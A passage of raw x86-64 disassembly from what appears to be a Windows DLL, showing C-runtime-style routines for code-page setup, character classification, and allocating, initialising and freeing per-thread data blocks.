   1800088bd:	48 83 c4 30          	add    $0x30,%rsp
   1800088c1:	41 5f                	pop    %r15
   1800088c3:	c3                   	ret
   1800088c4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800088c9:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1800088ce:	56                   	push   %rsi
   1800088cf:	57                   	push   %rdi
   1800088d0:	41 54                	push   %r12
   1800088d2:	41 56                	push   %r14
   1800088d4:	41 57                	push   %r15
   1800088d6:	48 83 ec 40          	sub    $0x40,%rsp
   1800088da:	48 8b 05 1f 07 01 00 	mov    0x1071f(%rip),%rax        # 0x180019000
   1800088e1:	48 33 c4             	xor    %rsp,%rax
   1800088e4:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800088e9:	48 8b da             	mov    %rdx,%rbx
   1800088ec:	e8 df f9 ff ff       	call   0x1800082d0
   1800088f1:	33 f6                	xor    %esi,%esi
   1800088f3:	8b f8                	mov    %eax,%edi
   1800088f5:	85 c0                	test   %eax,%eax
   1800088f7:	75 0d                	jne    0x180008906
   1800088f9:	48 8b cb             	mov    %rbx,%rcx
   1800088fc:	e8 4f fa ff ff       	call   0x180008350
   180008901:	e9 44 02 00 00       	jmp    0x180008b4a
   180008906:	4c 8d 25 23 0d 01 00 	lea    0x10d23(%rip),%r12        # 0x180019630
   18000890d:	8b ee                	mov    %esi,%ebp
   18000890f:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   180008915:	49 8b c4             	mov    %r12,%rax
   180008918:	39 38                	cmp    %edi,(%rax)
   18000891a:	0f 84 38 01 00 00    	je     0x180008a58
   180008920:	41 03 ef             	add    %r15d,%ebp
   180008923:	48 83 c0 30          	add    $0x30,%rax
   180008927:	83 fd 05             	cmp    $0x5,%ebp
   18000892a:	72 ec                	jb     0x180008918
   18000892c:	8d 87 18 02 ff ff    	lea    -0xfde8(%rdi),%eax
   180008932:	41 3b c7             	cmp    %r15d,%eax
   180008935:	0f 86 15 01 00 00    	jbe    0x180008a50
   18000893b:	0f b7 cf             	movzwl %di,%ecx
   18000893e:	ff 15 bc 87 00 00    	call   *0x87bc(%rip)        # 0x180011100
   180008944:	85 c0                	test   %eax,%eax
   180008946:	0f 84 04 01 00 00    	je     0x180008a50
   18000894c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180008951:	8b cf                	mov    %edi,%ecx
   180008953:	ff 15 bf 87 00 00    	call   *0x87bf(%rip)        # 0x180011118
   180008959:	85 c0                	test   %eax,%eax
   18000895b:	0f 84 e3 00 00 00    	je     0x180008a44
   180008961:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   180008965:	33 d2                	xor    %edx,%edx
   180008967:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   18000896d:	e8 ee c8 ff ff       	call   0x180005260
   180008972:	89 7b 04             	mov    %edi,0x4(%rbx)
   180008975:	48 89 b3 20 02 00 00 	mov    %rsi,0x220(%rbx)
   18000897c:	44 39 7c 24 20       	cmp    %r15d,0x20(%rsp)
   180008981:	0f 86 a6 00 00 00    	jbe    0x180008a2d
   180008987:	48 8d 54 24 26       	lea    0x26(%rsp),%rdx
   18000898c:	40 38 74 24 26       	cmp    %sil,0x26(%rsp)
   180008991:	74 39                	je     0x1800089cc
   180008993:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   180008997:	74 33                	je     0x1800089cc
   180008999:	0f b6 7a 01          	movzbl 0x1(%rdx),%edi
   18000899d:	44 0f b6 02          	movzbl (%rdx),%r8d
   1800089a1:	44 3b c7             	cmp    %edi,%r8d
   1800089a4:	77 1d                	ja     0x1800089c3
   1800089a6:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1800089aa:	48 8d 43 18          	lea    0x18(%rbx),%rax
   1800089ae:	48 03 c1             	add    %rcx,%rax
   1800089b1:	41 2b f8             	sub    %r8d,%edi
   1800089b4:	41 8d 0c 3f          	lea    (%r15,%rdi,1),%ecx
   1800089b8:	80 08 04             	orb    $0x4,(%rax)
   1800089bb:	49 03 c7             	add    %r15,%rax
   1800089be:	49 2b cf             	sub    %r15,%rcx
   1800089c1:	75 f5                	jne    0x1800089b8
   1800089c3:	48 83 c2 02          	add    $0x2,%rdx
   1800089c7:	40 38 32             	cmp    %sil,(%rdx)
   1800089ca:	75 c7                	jne    0x180008993
   1800089cc:	48 8d 43 1a          	lea    0x1a(%rbx),%rax
   1800089d0:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   1800089d5:	80 08 08             	orb    $0x8,(%rax)
   1800089d8:	49 03 c7             	add    %r15,%rax
   1800089db:	49 2b cf             	sub    %r15,%rcx
   1800089de:	75 f5                	jne    0x1800089d5
   1800089e0:	8b 4b 04             	mov    0x4(%rbx),%ecx
   1800089e3:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   1800089e9:	74 2e                	je     0x180008a19
   1800089eb:	83 e9 04             	sub    $0x4,%ecx
   1800089ee:	74 20                	je     0x180008a10
   1800089f0:	83 e9 0d             	sub    $0xd,%ecx
   1800089f3:	74 12                	je     0x180008a07
   1800089f5:	ff c9                	dec    %ecx
   1800089f7:	74 05                	je     0x1800089fe
   1800089f9:	48 8b c6             	mov    %rsi,%rax
   1800089fc:	eb 22                	jmp    0x180008a20
   1800089fe:	48 8b 05 b3 99 00 00 	mov    0x99b3(%rip),%rax        # 0x1800123b8
   180008a05:	eb 19                	jmp    0x180008a20
   180008a07:	48 8b 05 a2 99 00 00 	mov    0x99a2(%rip),%rax        # 0x1800123b0
   180008a0e:	eb 10                	jmp    0x180008a20
   180008a10:	48 8b 05 91 99 00 00 	mov    0x9991(%rip),%rax        # 0x1800123a8
   180008a17:	eb 07                	jmp    0x180008a20
   180008a19:	48 8b 05 80 99 00 00 	mov    0x9980(%rip),%rax        # 0x1800123a0
   180008a20:	48 89 83 20 02 00 00 	mov    %rax,0x220(%rbx)
   180008a27:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   180008a2b:	eb 03                	jmp    0x180008a30
   180008a2d:	89 73 08             	mov    %esi,0x8(%rbx)
   180008a30:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   180008a34:	0f b7 c6             	movzwl %si,%eax
   180008a37:	b9 06 00 00 00       	mov    $0x6,%ecx
   180008a3c:	66 f3 ab             	rep stos %ax,(%rdi)
   180008a3f:	e9 fe 00 00 00       	jmp    0x180008b42
   180008a44:	39 35 26 2a 01 00    	cmp    %esi,0x12a26(%rip)        # 0x18001b470
   180008a4a:	0f 85 a9 fe ff ff    	jne    0x1800088f9
   180008a50:	83 c8 ff             	or     $0xffffffff,%eax
   180008a53:	e9 f4 00 00 00       	jmp    0x180008b4c
   180008a58:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   180008a5c:	33 d2                	xor    %edx,%edx
   180008a5e:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   180008a64:	e8 f7 c7 ff ff       	call   0x180005260
   180008a69:	8b c5                	mov    %ebp,%eax
   180008a6b:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   180008a70:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   180008a74:	4c 8d 35 ad 0b 01 00 	lea    0x10bad(%rip),%r14        # 0x180019628
   180008a7b:	bd 04 00 00 00       	mov    $0x4,%ebp
   180008a80:	49 c1 e3 04          	shl    $0x4,%r11
   180008a84:	4d 03 cb             	add    %r11,%r9
   180008a87:	49 8b d1             	mov    %r9,%rdx
   180008a8a:	41 38 31             	cmp    %sil,(%r9)
   180008a8d:	74 40                	je     0x180008acf
   180008a8f:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   180008a93:	74 3a                	je     0x180008acf
   180008a95:	44 0f b6 02          	movzbl (%rdx),%r8d
   180008a99:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   180008a9d:	44 3b c0             	cmp    %eax,%r8d
   180008aa0:	77 24                	ja     0x180008ac6
   180008aa2:	45 8d 50 01          	lea    0x1(%r8),%r10d
   180008aa6:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   180008aad:	73 17                	jae    0x180008ac6
   180008aaf:	41 8a 06             	mov    (%r14),%al
   180008ab2:	45 03 c7             	add    %r15d,%r8d
   180008ab5:	41 08 44 1a 18       	or     %al,0x18(%r10,%rbx,1)
   180008aba:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   180008abe:	45 03 d7             	add    %r15d,%r10d
   180008ac1:	44 3b c0             	cmp    %eax,%r8d
   180008ac4:	76 e0                	jbe    0x180008aa6
   180008ac6:	48 83 c2 02          	add    $0x2,%rdx
   180008aca:	40 38 32             	cmp    %sil,(%rdx)
   180008acd:	75 c0                	jne    0x180008a8f
   180008acf:	49 83 c1 08          	add    $0x8,%r9
   180008ad3:	4d 03 f7             	add    %r15,%r14
   180008ad6:	49 2b ef             	sub    %r15,%rbp
   180008ad9:	75 ac                	jne    0x180008a87
   180008adb:	89 7b 04             	mov    %edi,0x4(%rbx)
   180008ade:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   180008ae2:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   180008ae8:	74 29                	je     0x180008b13
   180008aea:	83 ef 04             	sub    $0x4,%edi
   180008aed:	74 1b                	je     0x180008b0a
   180008aef:	83 ef 0d             	sub    $0xd,%edi
   180008af2:	74 0d                	je     0x180008b01
   180008af4:	ff cf                	dec    %edi
   180008af6:	75 22                	jne    0x180008b1a
   180008af8:	48 8b 35 b9 98 00 00 	mov    0x98b9(%rip),%rsi        # 0x1800123b8
   180008aff:	eb 19                	jmp    0x180008b1a
   180008b01:	48 8b 35 a8 98 00 00 	mov    0x98a8(%rip),%rsi        # 0x1800123b0
   180008b08:	eb 10                	jmp    0x180008b1a
   180008b0a:	48 8b 35 97 98 00 00 	mov    0x9897(%rip),%rsi        # 0x1800123a8
   180008b11:	eb 07                	jmp    0x180008b1a
   180008b13:	48 8b 35 86 98 00 00 	mov    0x9886(%rip),%rsi        # 0x1800123a0
   180008b1a:	4c 2b db             	sub    %rbx,%r11
   180008b1d:	48 89 b3 20 02 00 00 	mov    %rsi,0x220(%rbx)
   180008b24:	48 8d 4b 0c          	lea    0xc(%rbx),%rcx
   180008b28:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   180008b2c:	ba 06 00 00 00       	mov    $0x6,%edx
   180008b31:	0f b7 44 0f f8       	movzwl -0x8(%rdi,%rcx,1),%eax
   180008b36:	66 89 01             	mov    %ax,(%rcx)
   180008b39:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   180008b3d:	49 2b d7             	sub    %r15,%rdx
   180008b40:	75 ef                	jne    0x180008b31
   180008b42:	48 8b cb             	mov    %rbx,%rcx
   180008b45:	e8 96 f8 ff ff       	call   0x1800083e0
   180008b4a:	33 c0                	xor    %eax,%eax
   180008b4c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180008b51:	48 33 cc             	xor    %rsp,%rcx
   180008b54:	e8 d7 c6 ff ff       	call   0x180005230
   180008b59:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   180008b5e:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   180008b62:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   180008b66:	49 8b e3             	mov    %r11,%rsp
   180008b69:	41 5f                	pop    %r15
   180008b6b:	41 5e                	pop    %r14
   180008b6d:	41 5c                	pop    %r12
   180008b6f:	5f                   	pop    %rdi
   180008b70:	5e                   	pop    %rsi
   180008b71:	c3                   	ret
   180008b72:	cc                   	int3
   180008b73:	cc                   	int3
   180008b74:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180008b79:	55                   	push   %rbp
   180008b7a:	57                   	push   %rdi
   180008b7b:	41 56                	push   %r14
   180008b7d:	48 8b ec             	mov    %rsp,%rbp
   180008b80:	48 83 ec 60          	sub    $0x60,%rsp
   180008b84:	48 63 f9             	movslq %ecx,%rdi
   180008b87:	44 8b f2             	mov    %edx,%r14d
   180008b8a:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180008b8e:	49 8b d0             	mov    %r8,%rdx
   180008b91:	e8 5e d3 ff ff       	call   0x180005ef4
   180008b96:	8d 47 01             	lea    0x1(%rdi),%eax
   180008b99:	3d 00 01 00 00       	cmp    $0x100,%eax
   180008b9e:	77 11                	ja     0x180008bb1
   180008ba0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   180008ba4:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   180008bab:	0f b7 04 79          	movzwl (%rcx,%rdi,2),%eax
   180008baf:	eb 79                	jmp    0x180008c2a
   180008bb1:	8b f7                	mov    %edi,%esi
   180008bb3:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   180008bb7:	c1 fe 08             	sar    $0x8,%esi
   180008bba:	40 0f b6 ce          	movzbl %sil,%ecx
   180008bbe:	e8 c5 37 00 00       	call   0x18000c388
   180008bc3:	ba 01 00 00 00       	mov    $0x1,%edx
   180008bc8:	85 c0                	test   %eax,%eax
   180008bca:	74 12                	je     0x180008bde
   180008bcc:	40 88 75 38          	mov    %sil,0x38(%rbp)
   180008bd0:	40 88 7d 39          	mov    %dil,0x39(%rbp)
   180008bd4:	c6 45 3a 00          	movb   $0x0,0x3a(%rbp)
   180008bd8:	44 8d 4a 01          	lea    0x1(%rdx),%r9d
   180008bdc:	eb 0b                	jmp    0x180008be9
   180008bde:	40 88 7d 38          	mov    %dil,0x38(%rbp)
   180008be2:	c6 45 39 00          	movb   $0x0,0x39(%rbp)
   180008be6:	44 8b ca             	mov    %edx,%r9d
   180008be9:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   180008bed:	89 54 24 30          	mov    %edx,0x30(%rsp)
   180008bf1:	4c 8d 45 38          	lea    0x38(%rbp),%r8
   180008bf5:	8b 48 04             	mov    0x4(%rax),%ecx
   180008bf8:	48 8d 45 20          	lea    0x20(%rbp),%rax
   180008bfc:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   180008c00:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180008c04:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180008c09:	e8 fe 36 00 00       	call   0x18000c30c
   180008c0e:	85 c0                	test   %eax,%eax
   180008c10:	75 14                	jne    0x180008c26
   180008c12:	38 45 f8             	cmp    %al,-0x8(%rbp)
   180008c15:	74 0b                	je     0x180008c22
   180008c17:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   180008c1b:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   180008c22:	33 c0                	xor    %eax,%eax
   180008c24:	eb 18                	jmp    0x180008c3e
   180008c26:	0f b7 45 20          	movzwl 0x20(%rbp),%eax
   180008c2a:	41 23 c6             	and    %r14d,%eax
   180008c2d:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   180008c31:	74 0b                	je     0x180008c3e
   180008c33:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   180008c37:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180008c3e:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   180008c45:	00 
   180008c46:	48 83 c4 60          	add    $0x60,%rsp
   180008c4a:	41 5e                	pop    %r14
   180008c4c:	5f                   	pop    %rdi
   180008c4d:	5d                   	pop    %rbp
   180008c4e:	c3                   	ret
   180008c4f:	cc                   	int3
   180008c50:	48 85 c9             	test   %rcx,%rcx
   180008c53:	0f 84 29 01 00 00    	je     0x180008d82
   180008c59:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180008c5e:	57                   	push   %rdi
   180008c5f:	48 83 ec 20          	sub    $0x20,%rsp
   180008c63:	48 8b d9             	mov    %rcx,%rbx
   180008c66:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   180008c6a:	48 85 c9             	test   %rcx,%rcx
   180008c6d:	74 05                	je     0x180008c74
   180008c6f:	e8 0c c9 ff ff       	call   0x180005580
   180008c74:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   180008c78:	48 85 c9             	test   %rcx,%rcx
   180008c7b:	74 05                	je     0x180008c82
   180008c7d:	e8 fe c8 ff ff       	call   0x180005580
   180008c82:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   180008c86:	48 85 c9             	test   %rcx,%rcx
   180008c89:	74 05                	je     0x180008c90
   180008c8b:	e8 f0 c8 ff ff       	call   0x180005580
   180008c90:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   180008c94:	48 85 c9             	test   %rcx,%rcx
   180008c97:	74 05                	je     0x180008c9e
   180008c99:	e8 e2 c8 ff ff       	call   0x180005580
   180008c9e:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   180008ca2:	48 85 c9             	test   %rcx,%rcx
   180008ca5:	74 05                	je     0x180008cac
   180008ca7:	e8 d4 c8 ff ff       	call   0x180005580
   180008cac:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   180008cb0:	48 85 c9             	test   %rcx,%rcx
   180008cb3:	74 05                	je     0x180008cba
   180008cb5:	e8 c6 c8 ff ff       	call   0x180005580
   180008cba:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   180008cc1:	48 85 c9             	test   %rcx,%rcx
   180008cc4:	74 05                	je     0x180008ccb
   180008cc6:	e8 b5 c8 ff ff       	call   0x180005580
   180008ccb:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   180008cd2:	48 8d 05 67 9b 00 00 	lea    0x9b67(%rip),%rax        # 0x180012840
   180008cd9:	48 3b c8             	cmp    %rax,%rcx
   180008cdc:	74 05                	je     0x180008ce3
   180008cde:	e8 9d c8 ff ff       	call   0x180005580
   180008ce3:	bf 0d 00 00 00       	mov    $0xd,%edi
   180008ce8:	8b cf                	mov    %edi,%ecx
   180008cea:	e8 1d 20 00 00       	call   0x18000ad0c
   180008cef:	90                   	nop
   180008cf0:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   180008cf7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180008cfc:	48 85 c9             	test   %rcx,%rcx
   180008cff:	74 1c                	je     0x180008d1d
   180008d01:	f0 ff 09             	lock decl (%rcx)
   180008d04:	75 17                	jne    0x180008d1d
   180008d06:	48 8d 05 f3 06 01 00 	lea    0x106f3(%rip),%rax        # 0x180019400
   180008d0d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180008d12:	48 3b c8             	cmp    %rax,%rcx
   180008d15:	74 06                	je     0x180008d1d
   180008d17:	e8 64 c8 ff ff       	call   0x180005580
   180008d1c:	90                   	nop
   180008d1d:	8b cf                	mov    %edi,%ecx
   180008d1f:	e8 d8 21 00 00       	call   0x18000aefc
   180008d24:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008d29:	e8 de 1f 00 00       	call   0x18000ad0c
   180008d2e:	90                   	nop
   180008d2f:	48 8b bb c0 00 00 00 	mov    0xc0(%rbx),%rdi
   180008d36:	48 85 ff             	test   %rdi,%rdi
   180008d39:	74 2b                	je     0x180008d66
   180008d3b:	48 8b cf             	mov    %rdi,%rcx
   180008d3e:	e8 e5 f3 ff ff       	call   0x180008128
   180008d43:	48 3b 3d b6 0c 01 00 	cmp    0x10cb6(%rip),%rdi        # 0x180019a00
   180008d4a:	74 1a                	je     0x180008d66
   180008d4c:	48 8d 05 bd 0c 01 00 	lea    0x10cbd(%rip),%rax        # 0x180019a10
   180008d53:	48 3b f8             	cmp    %rax,%rdi
   180008d56:	74 0e                	je     0x180008d66
   180008d58:	83 3f 00             	cmpl   $0x0,(%rdi)
   180008d5b:	75 09                	jne    0x180008d66
   180008d5d:	48 8b cf             	mov    %rdi,%rcx
   180008d60:	e8 2b f2 ff ff       	call   0x180007f90
   180008d65:	90                   	nop
   180008d66:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008d6b:	e8 8c 21 00 00       	call   0x18000aefc
   180008d70:	48 8b cb             	mov    %rbx,%rcx
   180008d73:	e8 08 c8 ff ff       	call   0x180005580
   180008d78:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180008d7d:	48 83 c4 20          	add    $0x20,%rsp
   180008d81:	5f                   	pop    %rdi
   180008d82:	c3                   	ret
   180008d83:	cc                   	int3
   180008d84:	40 53                	rex push %rbx
   180008d86:	48 83 ec 20          	sub    $0x20,%rsp
   180008d8a:	48 8b d9             	mov    %rcx,%rbx
   180008d8d:	8b 0d 95 09 01 00    	mov    0x10995(%rip),%ecx        # 0x180019728
   180008d93:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180008d96:	74 22                	je     0x180008dba
   180008d98:	48 85 db             	test   %rbx,%rbx
   180008d9b:	75 0e                	jne    0x180008dab
   180008d9d:	e8 ae 0e 00 00       	call   0x180009c50
   180008da2:	8b 0d 80 09 01 00    	mov    0x10980(%rip),%ecx        # 0x180019728
   180008da8:	48 8b d8             	mov    %rax,%rbx
   180008dab:	33 d2                	xor    %edx,%edx
   180008dad:	e8 ba 0e 00 00       	call   0x180009c6c
   180008db2:	48 8b cb             	mov    %rbx,%rcx
   180008db5:	e8 96 fe ff ff       	call   0x180008c50
   180008dba:	48 83 c4 20          	add    $0x20,%rsp
   180008dbe:	5b                   	pop    %rbx
   180008dbf:	c3                   	ret
   180008dc0:	40 53                	rex push %rbx
   180008dc2:	48 83 ec 20          	sub    $0x20,%rsp
   180008dc6:	e8 19 00 00 00       	call   0x180008de4
   180008dcb:	48 8b d8             	mov    %rax,%rbx
   180008dce:	48 85 c0             	test   %rax,%rax
   180008dd1:	75 08                	jne    0x180008ddb
   180008dd3:	8d 48 10             	lea    0x10(%rax),%ecx
   180008dd6:	e8 d1 ea ff ff       	call   0x1800078ac
   180008ddb:	48 8b c3             	mov    %rbx,%rax
   180008dde:	48 83 c4 20          	add    $0x20,%rsp
   180008de2:	5b                   	pop    %rbx
   180008de3:	c3                   	ret
   180008de4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008de9:	57                   	push   %rdi
   180008dea:	48 83 ec 20          	sub    $0x20,%rsp
   180008dee:	ff 15 84 82 00 00    	call   *0x8284(%rip)        # 0x180011078
   180008df4:	8b 0d 2e 09 01 00    	mov    0x1092e(%rip),%ecx        # 0x180019728
   180008dfa:	8b f8                	mov    %eax,%edi
   180008dfc:	e8 4f 0e 00 00       	call   0x180009c50
   180008e01:	48 8b d8             	mov    %rax,%rbx
   180008e04:	48 85 c0             	test   %rax,%rax
   180008e07:	75 47                	jne    0x180008e50
   180008e09:	8d 48 01             	lea    0x1(%rax),%ecx
   180008e0c:	ba 78 04 00 00       	mov    $0x478,%edx
   180008e11:	e8 2e 13 00 00       	call   0x18000a144
   180008e16:	48 8b d8             	mov    %rax,%rbx
   180008e19:	48 85 c0             	test   %rax,%rax
   180008e1c:	74 32                	je     0x180008e50
   180008e1e:	8b 0d 04 09 01 00    	mov    0x10904(%rip),%ecx        # 0x180019728
   180008e24:	48 8b d0             	mov    %rax,%rdx
   180008e27:	e8 40 0e 00 00       	call   0x180009c6c
   180008e2c:	48 8b cb             	mov    %rbx,%rcx
   180008e2f:	85 c0                	test   %eax,%eax
   180008e31:	74 16                	je     0x180008e49
   180008e33:	33 d2                	xor    %edx,%edx
   180008e35:	e8 2e 00 00 00       	call   0x180008e68
   180008e3a:	ff 15 58 82 00 00    	call   *0x8258(%rip)        # 0x180011098
   180008e40:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   180008e45:	89 03                	mov    %eax,(%rbx)
   180008e47:	eb 07                	jmp    0x180008e50
   180008e49:	e8 32 c7 ff ff       	call   0x180005580
   180008e4e:	33 db                	xor    %ebx,%ebx
   180008e50:	8b cf                	mov    %edi,%ecx
   180008e52:	ff 15 c8 82 00 00    	call   *0x82c8(%rip)        # 0x180011120
   180008e58:	48 8b c3             	mov    %rbx,%rax
   180008e5b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008e60:	48 83 c4 20          	add    $0x20,%rsp
   180008e64:	5f                   	pop    %rdi
   180008e65:	c3                   	ret
   180008e66:	cc                   	int3
   180008e67:	cc                   	int3
   180008e68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008e6d:	57                   	push   %rdi
   180008e6e:	48 83 ec 20          	sub    $0x20,%rsp
   180008e72:	48 8b fa             	mov    %rdx,%rdi
   180008e75:	48 8b d9             	mov    %rcx,%rbx
   180008e78:	48 8d 05 c1 99 00 00 	lea    0x99c1(%rip),%rax        # 0x180012840
   180008e7f:	48 89 81 a0 00 00 00 	mov    %rax,0xa0(%rcx)
   180008e86:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   180008e8a:	c7 41 1c 01 00 00 00 	movl   $0x1,0x1c(%rcx)
   180008e91:	c7 81 c8 00 00 00 01 	movl   $0x1,0xc8(%rcx)
   180008e98:	00 00 00 
   180008e9b:	b8 43 00 00 00       	mov    $0x43,%eax
   180008ea0:	66 89 81 64 01 00 00 	mov    %ax,0x164(%rcx)
   180008ea7:	66 89 81 6a 02 00 00 	mov    %ax,0x26a(%rcx)
   180008eae:	48 8d 05 4b 05 01 00 	lea    0x1054b(%rip),%rax        # 0x180019400
   180008eb5:	48 89 81 b8 00 00 00 	mov    %rax,0xb8(%rcx)
   180008ebc:	48 83 a1 70 04 00 00 	andq   $0x0,0x470(%rcx)
   180008ec3:	00 
   180008ec4:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180008ec9:	e8 3e 1e 00 00       	call   0x18000ad0c
   180008ece:	90                   	nop
   180008ecf:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   180008ed6:	f0 ff 00             	lock incl (%rax)
   180008ed9:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180008ede:	e8 19 20 00 00       	call   0x18000aefc
   180008ee3:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008ee8:	e8 1f 1e 00 00       	call   0x18000ad0c
   180008eed:	90                   	nop
   180008eee:	48 89 bb c0 00 00 00 	mov    %rdi,0xc0(%rbx)
   180008ef5:	48 85 ff             	test   %rdi,%rdi
   180008ef8:	75 0e                	jne    0x180008f08
   180008efa:	48 8b 05 ff 0a 01 00 	mov    0x10aff(%rip),%rax        # 0x180019a00
   180008f01:	48 89 83 c0 00 00 00 	mov    %rax,0xc0(%rbx)
   180008f08:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   180008f0f:	e8 f0 ef ff ff       	call   0x180007f04
   180008f14:	90                   	nop
   180008f15:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008f1a:	e8 dd 1f 00 00       	call   0x18000aefc
   180008f1f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008f24:	48 83 c4 20          	add    $0x20,%rsp
   180008f28:	5f                   	pop    %rdi
   180008f29:	c3                   	ret
   180008f2a:	cc                   	int3
   180008f2b:	cc                   	int3
   180008f2c:	40 53                	rex push %rbx
   180008f2e:	48 83 ec 20          	sub    $0x20,%rsp
   180008f32:	e8 51 ea ff ff       	call   0x180007988
   180008f37:	e8 5c 1f 00 00       	call   0x18000ae98
   180008f3c:	85 c0                	test   %eax,%eax
   180008f3e:	74 5e                	je     0x180008f9e
   180008f40:	48 8d 0d 09 fd ff ff 	lea    -0x2f7(%rip),%rcx        # 0x180008c50
   180008f47:	e8 cc 0c 00 00       	call   0x180009c18
   180008f4c:	89 05 d6 07 01 00    	mov    %eax,0x107d6(%rip)        # 0x180019728
   180008f52:	83 f8 ff             	cmp    $0xffffffff,%eax
   180008f55:	74 47                	je     0x180008f9e
   180008f57:	ba 78 04 00 00       	mov    $0x478,%edx
   180008f5c:	b9 01 00 00 00       	mov    $0x1,%ecx
   180008f61:	e8 de 11 00 00       	call   0x18000a144
   180008f66:	48 8b d8             	mov    %rax,%rbx
   180008f69:	48 85 c0             	test   %rax,%rax
   180008f6c:	74 30                	je     0x180008f9e
   180008f6e:	8b 0d b4 07 01 00    	mov    0x107b4(%rip),%ecx        # 0x180019728
   180008f74:	48 8b d0             	mov    %rax,%rdx
   180008f77:	e8 f0 0c 00 00       	call   0x180009c6c
   180008f7c:	85 c0                	test   %eax,%eax
   180008f7e:	74 1e                	je     0x180008f9e
   180008f80:	33 d2                	xor    %edx,%edx
   180008f82:	48 8b cb             	mov    %rbx,%rcx
   180008f85:	e8 de fe ff ff       	call   0x180008e68
   180008f8a:	ff 15 08 81 00 00    	call   *0x8108(%rip)        # 0x180011098
   180008f90:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   180008f95:	89 03                	mov    %eax,(%rbx)
   180008f97:	b8 01 00 00 00       	mov    $0x1,%eax
   180008f9c:	eb 07                	jmp    0x180008fa5
   180008f9e:	e8 09 00 00 00       	call   0x180008fac
   180008fa3:	33 c0                	xor    %eax,%eax
   180008fa5:	48 83 c4 20          	add    $0x20,%rsp
   180008fa9:	5b                   	pop    %rbx
   180008faa:	c3                   	ret
   180008fab:	cc                   	int3
   180008fac:	48 83 ec 28          	sub    $0x28,%rsp
   180008fb0:	8b 0d 72 07 01 00    	mov    0x10772(%rip),%ecx        # 0x180019728
   180008fb6:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180008fb9:	74 0c                	je     0x180008fc7
   180008fbb:	e8 74 0c 00 00       	call   0x180009c34
   180008fc0:	83 0d 61 07 01 00 ff 	orl    $0xffffffff,0x10761(%rip)        # 0x180019728
   180008fc7:	48 83 c4 28          	add    $0x28,%rsp
   180008fcb:	e9 80 1d 00 00       	jmp    0x18000ad50
   180008fd0:	40 57                	rex push %rdi
   180008fd2:	48 83 ec 20          	sub    $0x20,%rsp
